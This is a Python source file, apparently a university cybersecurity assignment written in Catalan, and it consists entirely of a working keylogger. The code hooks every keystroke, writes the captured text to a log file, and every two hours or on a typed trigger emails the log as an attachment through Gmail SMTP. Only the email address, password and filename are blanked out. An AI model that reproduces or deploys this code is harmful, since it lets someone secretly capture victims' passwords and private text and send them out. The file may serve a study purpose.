#############################################
# Silvia Sanvicente, 2021/2022              #
# Fonaments de ciberseguretat               #
# PAC 3                                     #
#############################################

from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders
from smtplib import SMTP
from threading import Timer
import keyboard as kb
import time

FREQ_ENVIAMENT = 7200  # (2 hores)
FREQ_SALT = 300  # (5 mins)
NOM_FITXER = "..."
CORREU = "..."
CONTRASENYA = "..."


def escriure(fitxer, text):
    # escriure al fitxer ('a' per no sobreescriure)
    with open(fitxer, 'a') as file:
        file.write(text)


class Keylogger:
    def __init__(self):
        self.text = ""
        self.inici_temps_enviar = time.time()
        self.inici_temps_salt = time.time()
        self.iniciar()

    def iniciar(self):
        kb.on_release(self.capturar)
        self.executar()
        kb.wait()

    def capturar(self, event):
        tecla = event.name
        # llista de tecles especials
        especials = ['alt', 'alt gr', 'ctrl', 'left alt', 'left ctrl', 'left shift', 'left windows', 'right alt',
                     'right ctrl', 'right shift', 'right windows', 'shift', 'windows', 'space', 'backspace', 'down',
                     'right', 'left', 'ctrl', 'shift', 'caps lock']
        if len(tecla) != 1:
            if tecla == "enter":
                tecla = "\n"
            # per simplificar per les tecles especials deixem un espai
            elif tecla in especials:
                tecla = " "
        self.text += tecla
        # "clau" per exportar manualment
        if "..." in self.text:
            self.enviar()

    def executar(self):
        interval_salt = int(time.time() - self.inici_temps_salt)
        interval_enviar = int(time.time() - self.inici_temps_enviar)
        print(f'interval_salt: {interval_salt}s')
        print(f'interval_enviar: {interval_enviar}s')
        if interval_salt >= FREQ_SALT:
            if not self.text:
                self.inici_temps_salt = time.time()
                escriure(NOM_FITXER, "[SALT DE LINIA]\n")
                print('==> salt de linia')
        if interval_enviar >= FREQ_ENVIAMENT:
            self.inici_temps_enviar = time.time()
            self.inici_temps_salt = time.time()
            self.enviar()
            self.text = ""
        Timer(FREQ_SALT, self.executar).start()

    def enviar(self):
        # escrivim al fitxer el que tenim al "canal"
        escriure(NOM_FITXER, self.text)
        # per enviar el fitxer adjunt
        missatge = MIMEMultipart()
        adjunt = MIMEBase('application', "octet-stream")
        adjunt.set_payload(open(NOM_FITXER, "rb").read())
        encoders.encode_base64(adjunt)
        adjunt.add_header('Content-Disposition', 'attachment', filename=NOM_FITXER)
        missatge.attach(adjunt)
        # enviament
        server = SMTP('smtp.gmail.com: 587')
        server.starttls()
        server.login(CORREU, CONTRASENYA)
        server.sendmail(CORREU, CORREU, missatge.as_string())
        server.quit()
        self.text = ""
        print('==> mail enviat')


if __name__ == "__main__":
    keylogger = Keylogger()
